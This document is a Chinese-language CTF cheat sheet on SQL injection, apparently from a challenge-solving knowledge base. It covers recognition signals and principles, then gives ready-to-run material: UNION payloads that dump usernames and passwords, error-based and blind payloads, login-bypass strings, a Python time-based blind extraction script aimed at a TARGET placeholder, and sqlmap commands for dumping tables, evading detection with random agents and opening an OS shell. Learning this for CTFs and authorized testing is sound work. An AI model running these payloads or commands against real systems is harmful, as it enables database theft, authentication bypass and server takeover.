---
title: SQL 注入基础（联合查询 / 盲注 / 时间盲注 + sqlmap）
category: web
tags: [sql 注入, sqli, sqlmap, 联合注入, 盲注]
signals: [id=1 页面回显不同, 单引号报错, you have an error in your sql syntax, 可以排序 order by, union select, 登录框, 参数有数值回显, 布尔盲注, sleep 延迟, 数据库报错]
difficulty: easy
source: "OWASP / PayloadsAllTheThings / PortSwigger"
tools: [sqlmap, curl, burpsuite, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- URL 形如 `?id=1`、`?category=news`，改动参数后页面内容随值变化。
- 输入 `'` 出现 `You have an error in your SQL syntax`、`Unclosed quotation mark` 或 500。
- `?id=1' and '1'='1` 与 `?id=1' and '1'='2` 返回不同内容 —— 存在注入。
- 登录框：`admin' --`、`admin'#`、`" or 1=1-- -` 尝试绕过认证。
- `?id=1 order by 3` 正常、`order by 4` 报错 —— 说明可联合查询，列数为 3。
- `?id=1 and sleep(3)` 响应延迟 3 秒，且页面无回显 → 时间盲注。
- 关键词：SQL、database、注入、union、盲注、布尔。

## 二、原理

应用把用户输入直接拼进 SQL 语句：

```php
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

输入 `1 UNION SELECT 1,2,3` 就让返回集合多了攻击者构造的行；输入 `1 AND SLEEP(3)` 让数据库执行任意表达式。根据响应形态分为：

| 类型 | 特征 | 数据出口 |
|---|---|---|
| 联合查询注入 | 页面回显查询结果 | `UNION SELECT` 把数据打进回显位 |
| 报错注入 | 页面回显 SQL 报错 | `extractvalue`/`updatexml` 把数据塞进报错 |
| 布尔盲注 | 页面只有两种状态 | `AND 1=1` 逐字符二分 |
| 时间盲注 | 页面无回显 | `AND IF(...,SLEEP(3),0)` 计时 |
| 堆叠注入 | 驱动允许 `;` | `; INSERT/UPDATE` |

## 三、解题步骤

1. **判断注入点**：`id=1`、`id=1'`、`id=1"`、`id=1'-- -`、`id=1 AND 1=1`。
2. **确定列数**：`ORDER BY n` 递增直到报错；或 `UNION SELECT 1,2,3,...` 逐个加。
3. **找回显位**：`?id=-1 UNION SELECT 1,2,3`，页面显示 `2`、`3` 说明这两列会回显。
4. **取数据**：
   - 库名：`UNION SELECT 1,database(),3`
   - 表名：`UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()`
   - 列名：`... columns WHERE table_name='users'`
   - 数据：`UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users`
5. **盲注**：`SUBSTR(database(),i,1) > 'm'` 二分；时间盲注用 `IF(condition,SLEEP(3),0)`。
6. **sqlmap** 自动化（有授权时）。

## 四、可直接运行的脚本

手工验证 payload 集：

```text
# 判断列数
?id=1 ORDER BY 1-- -
?id=1 ORDER BY 3-- -
?id=1 ORDER BY 4-- -          # 报错 => 3 列

# 联合查询找回显位
?id=-1 UNION SELECT 1,2,3-- -

# MySQL 取数
?id=-1 UNION SELECT 1,database(),3-- -
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -

# 报错注入（MySQL 5.1+）
?id=1 AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -
?id=1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))-- -

# 布尔盲注
?id=1 AND SUBSTR((SELECT database()),1,1)='c'-- -
?id=1 AND ASCII(SUBSTR((SELECT database()),1,1))>100-- -

# 时间盲注
?id=1 AND IF(SUBSTR((SELECT database()),1,1)='c',SLEEP(3),0)-- -
?id=1 AND SLEEP(3)-- -

# 登录绕过
admin' -- 
admin'#
" or 1=1-- -
' OR '1'='1' -- 
```

时间盲注脚本（二分法，Python）：

```python
import requests, time

URL = "http://TARGET/index.php"
DELAY = 2.5

def cond(sqle):  # sqle: 返回真/假的表达式
    t = time.time()
    requests.get(URL, params={"id": "1 AND IF(%s,SLEEP(%d),0)" % (sqle, DELAY)})
    return time.time() - t >= DELAY

def char_at(expr, pos):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if cond("ASCII(SUBSTR(%s,%d,1)) > %d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def extract(expr, maxlen=64):
    out = ""
    for i in range(1, maxlen + 1):
        c = char_at(expr, i)
        if c in ("\x00", " "):
            break
        out += c
        print(out)
    return out

print(extract("(SELECT database())"))
```

sqlmap 常用命令：

```bash
# 基础扫描
sqlmap -u "http://TARGET/index.php?id=1" --batch

# 指定注入点 + 获取所有数据
sqlmap -u "http://TARGET/index.php?id=1" -p id --dbs
sqlmap -u "http://TARGET/index.php?id=1" -D DBS -T users -C username,password --dump

# POST / Cookie / Header 注入
sqlmap -u "http://TARGET/login.php" --data="user=a&pass=b" -p user --batch
sqlmap -u "http://TARGET/" --cookie="session=abc" --level=2 --batch

# 提速：sqlmap 的随机 agent + 多线程
sqlmap -u "http://TARGET/index.php?id=1" --threads=10 --random-agent --level=3 --risk=2 --batch

# 直接爆 shell（需 DBA 权限）
sqlmap -u "http://TARGET/index.php?id=1" --os-shell
```

## 五、常见坑 / 变体

- **`-- -` 必须带空格**：`--` 后需一个空格才成为注释，GET 中 `%20`；或直接用 `#`（需 URL 编码 `%23`）。
- **`UNION SELECT` 保持列数与类型一致**：`id=-1` 让原查询为空，才看得到注入结果。
- **`group_concat` 默认截断 1024 字节**（`group_concat_max_len`），长数据用 `SUBSTR` 分段。
- **时间盲注的 SLEEP 被 WAF 拦**：换 `BENCHMARK(1000000,MD5(1))`、`heavy query`。
- **SQL Server / Oracle 差异**：`information_schema` 不通用；Oracle 用 `all_tables`、`dual`，SQL Server 用 `sysobjects`。
- 变体：**二次注入**（先存后取）、**宽字节注入**（`%df'` + GBK）、**HTTP 参数污染**（HPP）、**JSON/XML 里的注入点**。
- sqlmap 扫不到时先 `--technique=BEUT` 指定、`--string`/`--not-string` 标注真值。

## 六、参考来源

- [OWASP Top 10 2021 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [PortSwigger Web Security Academy - SQL injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [CTF-Wiki SQL 注入](https://ctf-wiki.org/web/sqli/)
- [sqlmap 官方文档](https://github.com/sqlmapproject/sqlmap/wiki)
